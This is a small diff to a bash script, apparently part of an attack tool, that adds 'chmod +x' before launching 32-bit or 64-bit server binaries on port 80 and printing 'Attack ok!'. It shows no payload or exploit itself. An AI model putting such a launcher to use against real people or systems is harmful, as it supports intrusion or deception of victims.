@@ -282,6 +282,7 @@ chmod +x key.sh
 	if [ "$setserv" -eq "1" ]; then
           echo -e "$W[$R+$W] Start service 32bit..."
 	  sleep 2
+	  chmod +x $SYSTM32
 	  xterm -title "Skeleton Server Log" $DISPLAY_SERV -e ./$SYSTM32 http 80 &
 	  sleep 2
 
@@ -291,6 +292,7 @@ chmod +x key.sh
             echo -e "$W[$R+$W] Start service 64bit..."
 	    service apache2 start
 	    sleep 2
+	    chmod +x $SYSTM64
 	    xterm -title "Skeleton Server Log" $DISPLAY_SERV -e ./$SYSTM64 http 80 &
 	    sleep 2
 	    echo -e "$W[$R+$W] Attack ok!"
